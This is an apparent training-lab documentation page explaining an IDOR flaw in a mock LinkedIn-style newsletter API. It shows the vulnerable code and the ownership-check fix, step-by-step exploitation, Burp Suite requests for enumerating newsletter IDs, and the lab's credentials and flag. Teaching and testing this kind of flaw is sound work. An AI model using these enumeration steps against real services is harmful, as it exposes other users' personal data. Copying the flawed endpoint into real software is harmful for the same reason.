<?php
// Lab 29: LinkedPro Newsletter Platform - Technical Deep Dive Documentation
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Technical Deep Dive - Lab 29: Newsletter Subscriber IDOR</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #0a0a0f 0%, #0f1419 50%, #0a0a0f 100%);
            color: #e0e0e0;
            min-height: 100vh;
        }
        .nav-bar {
            background: rgba(10, 10, 15, 0.95);
            backdrop-filter: blur(10px);
            padding: 1rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(10, 102, 194, 0.2);
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .nav-logo {
            font-size: 1.4rem;
            font-weight: bold;
            color: #0a66c2;
            text-decoration: none;
        }
        .nav-logo span {
            color: #057642;
        }
        .nav-links {
            display: flex;
            gap: 1.5rem;
        }
        .nav-links a {
            color: #888;
            text-decoration: none;
            font-size: 0.9rem;
            transition: color 0.2s;
        }
        .nav-links a:hover, .nav-links a.active {
            color: #0a66c2;
        }
        .btn-back {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.5rem 1rem;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(10, 102, 194, 0.3);
            color: #e0e0e0;
            text-decoration: none;
            border-radius: 6px;
            font-weight: 500;
            font-size: 0.85rem;
            transition: all 0.3s;
        }
        .btn-back:hover {
            background: rgba(10, 102, 194, 0.2);
            border-color: #0a66c2;
            color: #0a66c2;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 2rem;
        }
        .back-link {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            color: #888;
            text-decoration: none;
            margin-bottom: 1.5rem;
            font-size: 0.9rem;
        }
        .back-link:hover {
            color: #0a66c2;
        }
        .page-header {
            text-align: center;
            margin-bottom: 3rem;
        }
        .page-header h1 {
            font-size: 2rem;
            background: linear-gradient(135deg, #0a66c2, #057642);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 0.75rem;
        }
        .page-header p {
            color: #888;
            font-size: 1.1rem;
        }
        .section {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 12px;
            padding: 2rem;
            margin-bottom: 2rem;
        }
        .section h2 {
            color: #0a66c2;
            font-size: 1.25rem;
            margin-bottom: 1.25rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        .section h3 {
            color: #057642;
            font-size: 1rem;
            margin: 1.5rem 0 0.75rem 0;
        }
        .section p {
            color: #aaa;
            line-height: 1.7;
            margin-bottom: 1rem;
        }
        .section ul, .section ol {
            color: #aaa;
            margin-left: 1.5rem;
            line-height: 1.8;
            margin-bottom: 1rem;
        }
        .section li {
            margin-bottom: 0.5rem;
        }
        .section code {
            background: rgba(10, 102, 194, 0.15);
            color: #7fc4fd;
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
            font-size: 0.85rem;
        }
        .code-block {
            background: #1a1a2e;
            border: 1px solid rgba(10, 102, 194, 0.2);
            border-radius: 8px;
            padding: 1rem;
            margin: 1rem 0;
            overflow-x: auto;
        }
        .code-block pre {
            margin: 0;
            color: #e0e0e0;
            font-size: 0.85rem;
            line-height: 1.6;
            white-space: pre;
        }
        .code-block .comment {
            color: #6a9955;
        }
        .code-block .keyword {
            color: #c586c0;
        }
        .code-block .function {
            color: #dcdcaa;
        }
        .code-block .string {
            color: #ce9178;
        }
        .code-block .variable {
            color: #9cdcfe;
        }
        .code-block .number {
            color: #b5cea8;
        }
        .code-title {
            background: rgba(10, 102, 194, 0.2);
            color: #7fc4fd;
            padding: 0.5rem 1rem;
            border-radius: 8px 8px 0 0;
            font-size: 0.8rem;
            font-weight: 600;
            margin-top: 1rem;
        }
        .code-block.with-title {
            border-radius: 0 0 8px 8px;
            margin-top: 0;
        }
        .warning-box {
            background: rgba(255, 0, 0, 0.08);
            border-left: 4px solid #ff4444;
            border-radius: 0 8px 8px 0;
            padding: 1rem 1rem 1rem 1.25rem;
            margin: 1rem 0;
        }
        .warning-box strong {
            color: #ff6b6b;
        }
        .info-box {
            background: rgba(10, 102, 194, 0.1);
            border-left: 4px solid #0a66c2;
            border-radius: 0 8px 8px 0;
            padding: 1rem 1rem 1rem 1.25rem;
            margin: 1rem 0;
        }
        .info-box strong {
            color: #0a66c2;
        }
        .success-box {
            background: rgba(5, 118, 66, 0.1);
            border-left: 4px solid #057642;
            border-radius: 0 8px 8px 0;
            padding: 1rem 1rem 1rem 1.25rem;
            margin: 1rem 0;
        }
        .success-box strong {
            color: #20c997;
        }
        .step-indicator {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 28px;
            height: 28px;
            background: linear-gradient(135deg, #0a66c2, #057642);
            border-radius: 50%;
            color: white;
            font-weight: bold;
            font-size: 0.85rem;
            margin-right: 0.75rem;
        }
        .attack-step {
            display: flex;
            align-items: flex-start;
            margin-bottom: 1.5rem;
            padding: 1rem;
            background: rgba(255, 255, 255, 0.02);
            border-radius: 8px;
        }
        .attack-step-content {
            flex: 1;
        }
        .attack-step-content h4 {
            color: #fff;
            margin-bottom: 0.5rem;
        }
        .attack-step-content p {
            margin-bottom: 0.5rem;
        }
        .http-request {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            overflow: hidden;
            margin: 1rem 0;
        }
        .http-request-header {
            background: #161b22;
            padding: 0.5rem 1rem;
            border-bottom: 1px solid #30363d;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        .http-method {
            background: #057642;
            color: white;
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
            font-size: 0.75rem;
            font-weight: bold;
        }
        .http-method.post {
            background: #0a66c2;
        }
        .http-url {
            color: #7fc4fd;
            font-family: monospace;
            font-size: 0.85rem;
        }
        .http-body {
            padding: 1rem;
            font-family: monospace;
            font-size: 0.85rem;
            color: #e0e0e0;
            white-space: pre;
            overflow-x: auto;
        }
        .nav-section {
            display: flex;
            gap: 1rem;
            justify-content: center;
            margin-top: 2rem;
            flex-wrap: wrap;
        }
        .btn {
            padding: 0.75rem 1.5rem;
            border-radius: 8px;
            font-size: 0.9rem;
            font-weight: 600;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            transition: all 0.3s ease;
        }
        .btn-primary {
            background: linear-gradient(135deg, #0a66c2, #004182);
            color: white;
        }
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(10, 102, 194, 0.4);
        }
        .btn-secondary {
            background: rgba(255, 255, 255, 0.05);
            color: #0a66c2;
            border: 1px solid rgba(10, 102, 194, 0.3);
        }
        .btn-secondary:hover {
            background: rgba(10, 102, 194, 0.1);
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 1rem 0;
        }
        th, td {
            padding: 0.75rem;
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }
        th {
            color: #0a66c2;
            font-weight: 600;
        }
        td {
            color: #aaa;
        }
        td code {
            background: rgba(10, 102, 194, 0.15);
            color: #7fc4fd;
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
            font-size: 0.8rem;
        }
        .toc {
            background: rgba(10, 102, 194, 0.05);
            border: 1px solid rgba(10, 102, 194, 0.2);
            border-radius: 8px;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }
        .toc h3 {
            color: #0a66c2;
            margin-bottom: 1rem;
        }
        .toc ul {
            list-style: none;
            margin-left: 0;
        }
        .toc li {
            margin-bottom: 0.5rem;
        }
        .toc a {
            color: #888;
            text-decoration: none;
        }
        .toc a:hover {
            color: #0a66c2;
        }
    </style>
</head>
<body>
    <nav class="nav-bar">
        <a href="index.php" class="nav-logo">Linked<span>Pro</span></a>
        <div class="nav-links">
            <a href="../index.php" class="btn-back">← All Labs</a>
            <a href="index.php">Home</a>
            <a href="lab-description.php">Lab Info</a>
            <a href="docs.php" class="active">Documentation</a>
            <a href="login.php">Login</a>
        </div>
    </nav>
    
    <div class="container">
        <a href="docs.php" class="back-link">← Back to Documentation Hub</a>
        
        <div class="page-header">
            <h1>🔍 Technical Deep Dive</h1>
            <p>Understanding the vulnerability mechanism and exploitation techniques</p>
        </div>
        
        <!-- Table of Contents -->
        <div class="toc">
            <h3>📑 Table of Contents</h3>
            <ul>
                <li><a href="#vulnerability">1. Vulnerability Analysis</a></li>
                <li><a href="#code-analysis">2. Vulnerable Code Analysis</a></li>
                <li><a href="#exploitation">3. Step-by-Step Exploitation</a></li>
                <li><a href="#api-anatomy">4. API Endpoint Anatomy</a></li>
                <li><a href="#burp-suite">5. Using Burp Suite for Exploitation</a></li>
                <li><a href="#edge-cases">6. Edge Cases and Variations</a></li>
            </ul>
        </div>
        
        <!-- Vulnerability Analysis -->
        <div class="section" id="vulnerability">
            <h2>🔬 1. Vulnerability Analysis</h2>
            
            <h3>What Makes This IDOR Special?</h3>
            <p>This IDOR vulnerability is particularly interesting because it involves URNs (Uniform Resource Names) rather than simple numeric IDs. LinkedIn uses URNs in the format:</p>
            
            <div class="code-block">
                <pre>urn:li:fsd_contentSeries:&lt;numeric_id&gt;</pre>
            </div>
            
            <p>While URNs appear more complex than simple IDs, they're still just references that can be enumerated or discovered.</p>
            
            <h3>The Missing Authorization Check</h3>
            <p>The vulnerability exists because the API endpoint:</p>
            <ul>
                <li>✅ Validates that the user is authenticated (logged in)</li>
                <li>✅ Validates that the seriesUrn parameter is provided</li>
                <li>❌ DOES NOT validate that the authenticated user owns the newsletter</li>
            </ul>
            
            <div class="warning-box">
                <strong>⚠️ The Critical Flaw:</strong> Being authenticated (logged in) is NOT the same as being authorized (having permission). The API confuses authentication with authorization.
            </div>
        </div>
        
        <!-- Code Analysis -->
        <div class="section" id="code-analysis">
            <h2>💻 2. Vulnerable Code Analysis</h2>
            
            <p>Let's examine the vulnerable code in <code>api/get_subscribers.php</code>:</p>
            
            <div class="code-title">📄 api/get_subscribers.php (Vulnerable)</div>
            <div class="code-block with-title">
                <pre><span class="comment">// ❌ VULNERABLE: Only checks if user is logged in</span>
<span class="keyword">if</span> (!isset($_SESSION[<span class="string">'user_id'</span>])) {
    http_response_code(<span class="number">401</span>);
    <span class="keyword">echo</span> json_encode([<span class="string">'error'</span> => <span class="string">'Unauthorized'</span>]);
    <span class="keyword">exit</span>;
}

<span class="comment">// Get parameters</span>
<span class="variable">$seriesUrn</span> = $_GET[<span class="string">'seriesUrn'</span>] ?? <span class="string">''</span>;

<span class="comment">// Extract ID from URN</span>
<span class="variable">$newsletter_id</span> = <span class="function">preg_replace</span>(<span class="string">'/[^0-9]/'</span>, <span class="string">''</span>, <span class="variable">$seriesUrn</span>);

<span class="comment">// ❌ MISSING: No check if $_SESSION['user_id'] owns this newsletter!</span>

<span class="comment">// Query directly without ownership verification</span>
<span class="variable">$query</span> = <span class="string">"SELECT u.*, s.subscribed_at FROM subscribers s 
          JOIN users u ON s.user_id = u.id 
          WHERE s.newsletter_id = ?"</span>;
<span class="variable">$stmt</span> = $conn-><span class="function">prepare</span>(<span class="variable">$query</span>);
<span class="variable">$stmt</span>-><span class="function">bind_param</span>(<span class="string">"i"</span>, <span class="variable">$newsletter_id</span>);
<span class="variable">$stmt</span>-><span class="function">execute</span>();</pre>
            </div>
            
            <p>The code retrieves subscribers for ANY newsletter ID extracted from the URN, without verifying the requesting user's ownership.</p>
            
            <h3>What's Missing?</h3>
            <p>A secure implementation would include an ownership check like this:</p>
            
            <div class="code-title">📄 Proper Authorization Check (Missing in Vulnerable Code)</div>
            <div class="code-block with-title">
                <pre><span class="comment">// ✅ SHOULD CHECK: Verify newsletter ownership</span>
<span class="variable">$check_query</span> = <span class="string">"SELECT creator_id FROM newsletters WHERE id = ?"</span>;
<span class="variable">$check_stmt</span> = $conn-><span class="function">prepare</span>(<span class="variable">$check_query</span>);
<span class="variable">$check_stmt</span>-><span class="function">bind_param</span>(<span class="string">"i"</span>, <span class="variable">$newsletter_id</span>);
<span class="variable">$check_stmt</span>-><span class="function">execute</span>();
<span class="variable">$newsletter</span> = <span class="variable">$check_stmt</span>-><span class="function">get_result</span>()-><span class="function">fetch_assoc</span>();

<span class="keyword">if</span> (<span class="variable">$newsletter</span>[<span class="string">'creator_id'</span>] !== $_SESSION[<span class="string">'user_id'</span>]) {
    http_response_code(<span class="number">403</span>);
    <span class="keyword">echo</span> json_encode([<span class="string">'error'</span> => <span class="string">'Forbidden: You do not own this newsletter'</span>]);
    <span class="keyword">exit</span>;
}</pre>
            </div>
        </div>
        
        <!-- Step-by-Step Exploitation -->
        <div class="section" id="exploitation">
            <h2>⚔️ 3. Step-by-Step Exploitation</h2>
            
            <div class="attack-step">
                <span class="step-indicator">1</span>
                <div class="attack-step-content">
                    <h4>Login as Attacker</h4>
                    <p>Access the lab and login with the attacker credentials:</p>
                    <ul>
                        <li>Username: <code>attacker</code></li>
                        <li>Password: <code>attacker123</code></li>
                    </ul>
                </div>
            </div>
            
            <div class="attack-step">
                <span class="step-indicator">2</span>
                <div class="attack-step-content">
                    <h4>Discover Newsletter URNs</h4>
                    <p>Navigate to the Newsletters page and observe that URNs are publicly visible:</p>
                    <ul>
                        <li>Alice's Newsletter: <code>urn:li:fsd_contentSeries:7890123456</code></li>
                        <li>Bob's Newsletter: <code>urn:li:fsd_contentSeries:8901234567</code></li>
                        <li>Carol's Newsletter: <code>urn:li:fsd_contentSeries:9012345678</code></li>
                    </ul>
                </div>
            </div>
            
            <div class="attack-step">
                <span class="step-indicator">3</span>
                <div class="attack-step-content">
                    <h4>Exploit via Web Interface</h4>
                    <p>Simply navigate to the subscribers page with a newsletter ID you don't own:</p>
                    <div class="code-block">
                        <pre>/subscribers.php?id=1</pre>
                    </div>
                    <p>The application will display all subscribers without verifying ownership!</p>
                </div>
            </div>
            
            <div class="attack-step">
                <span class="step-indicator">4</span>
                <div class="attack-step-content">
                    <h4>Exploit via API Directly</h4>
                    <p>Call the API endpoint directly with any newsletter URN:</p>
                    <div class="http-request">
                        <div class="http-request-header">
                            <span class="http-method">GET</span>
                            <span class="http-url">/api/get_subscribers.php?seriesUrn=urn:li:fsd_contentSeries:7890123456</span>
                        </div>
                        <div class="http-body">{
  "subscribers": [
    {
      "firstName": "David",
      "lastName": "Engineer", 
      "email": "david.engineer@techcorp.com",
      "headline": "Senior Software Engineer at TechCorp",
      "location": "San Francisco, CA",
      "connections": 892
    },
    ...
  ],
  "_debug": {
    "flag": "FLAG{linkedin_idor_newsletter_subscribers_exposed_2024}"
  }
}</div>
                    </div>
                </div>
            </div>
            
            <div class="attack-step">
                <span class="step-indicator">5</span>
                <div class="attack-step-content">
                    <h4>Retrieve the Flag</h4>
                    <p>The flag is returned in the API response or displayed on the subscribers page when you access subscribers of a newsletter you don't own.</p>
                    <div class="success-box">
                        <strong>🎉 Flag:</strong> <code>FLAG{linkedin_idor_newsletter_subscribers_exposed_2024}</code>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- API Anatomy -->
        <div class="section" id="api-anatomy">
            <h2>🔧 4. API Endpoint Anatomy</h2>
            
            <h3>Request Format</h3>
            <table>
                <tr>
                    <th>Parameter</th>
                    <th>Type</th>
                    <th>Description</th>
                    <th>Required</th>
                </tr>
                <tr>
                    <td><code>seriesUrn</code></td>
                    <td>String</td>
                    <td>Newsletter URN (e.g., urn:li:fsd_contentSeries:123)</td>
                    <td>Yes</td>
                </tr>
                <tr>
                    <td><code>count</code></td>
                    <td>Integer</td>
                    <td>Number of subscribers per page (default: 10)</td>
                    <td>No</td>
                </tr>
                <tr>
                    <td><code>start</code></td>
                    <td>Integer</td>
                    <td>Pagination offset (default: 0)</td>
                    <td>No</td>
                </tr>
            </table>
            
            <h3>Response Structure</h3>
            <div class="code-block">
                <pre>{
  "paging": {
    "count": 10,
    "start": 0,
    "total": 8
  },
  "elements": [
    {
      "subscriberIdentity": {
        "miniProfile": {
          "firstName": "David",
          "lastName": "Engineer",
          "occupation": "Senior Software Engineer at TechCorp",
          "publicIdentifier": "david-engineer",
          "entityUrn": "urn:li:fs_miniProfile:david-engineer"
        },
        "subscribedAt": 1703376000000,
        "memberInfo": {
          "email": "david.engineer@techcorp.com",
          "location": "San Francisco, CA",
          "connections": 892
        }
      }
    }
  ],
  "_debug": {
    "idor_detected": true,
    "flag": "FLAG{...}"
  }
}</pre>
            </div>
        </div>
        
        <!-- Burp Suite -->
        <div class="section" id="burp-suite">
            <h2>🛠️ 5. Using Burp Suite for Exploitation</h2>
            
            <h3>Intercepting the Request</h3>
            <ol>
                <li>Configure your browser to use Burp Suite as a proxy</li>
                <li>Login to LinkedPro normally</li>
                <li>Navigate to any newsletter and click "View Subscribers"</li>
                <li>In Burp Suite, find the request to <code>/api/get_subscribers.php</code></li>
                <li>Send it to Repeater</li>
            </ol>
            
            <h3>Modifying the Request</h3>
            <div class="code-block">
                <pre><span class="comment"># Original request (your newsletter)</span>
GET /api/get_subscribers.php?seriesUrn=urn:li:fsd_contentSeries:YOUR_ID HTTP/1.1
Host: localhost
Cookie: PHPSESSID=your_session

<span class="comment"># Modified request (victim's newsletter)</span>
GET /api/get_subscribers.php?seriesUrn=urn:li:fsd_contentSeries:7890123456 HTTP/1.1
Host: localhost
Cookie: PHPSESSID=your_session</pre>
            </div>
            
            <h3>Using Burp Intruder for Enumeration</h3>
            <p>You can use Burp Intruder to enumerate all newsletters:</p>
            <ol>
                <li>Send the request to Intruder</li>
                <li>Mark the newsletter ID as the injection point: <code>urn:li:fsd_contentSeries:§7890123456§</code></li>
                <li>Use a number wordlist or range payload</li>
                <li>Attack and analyze responses to find all newsletters with subscribers</li>
            </ol>
        </div>
        
        <!-- Edge Cases -->
        <div class="section" id="edge-cases">
            <h2>🎯 6. Edge Cases and Variations</h2>
            
            <h3>Alternative Attack Vectors</h3>
            
            <div class="info-box">
                <strong>📌 Direct Page Access:</strong> Instead of the API, you can directly access <code>/subscribers.php?id=1</code>, <code>?id=2</code>, etc.
            </div>
            
            <div class="info-box">
                <strong>📌 URN Enumeration:</strong> Even without knowing valid URNs, you can try sequential IDs: <code>fsd_contentSeries:1</code>, <code>fsd_contentSeries:2</code>, etc.
            </div>
            
            <div class="info-box">
                <strong>📌 Inspect Network Traffic:</strong> Browse newsletters normally and watch DevTools Network tab for API calls that reveal subscriber counts.
            </div>
            
            <h3>What If URNs Were Truly Random?</h3>
            <p>Even with random UUIDs instead of sequential IDs, this vulnerability would still be exploitable because:</p>
            <ul>
                <li>URNs are displayed publicly on newsletter pages</li>
                <li>URNs appear in page URLs and can be shared</li>
                <li>JavaScript code might expose URN patterns</li>
            </ul>
            <p>Security through obscurity is not security!</p>
        </div>
        
        <div class="nav-section">
            <a href="docs.php" class="btn btn-secondary">← Documentation Hub</a>
            <a href="docs-mitigation.php" class="btn btn-primary">🛡️ Mitigation Guide →</a>
            <a href="login.php" class="btn btn-secondary">🚀 Try the Lab</a>
        </div>
    </div>
</body>
</html>
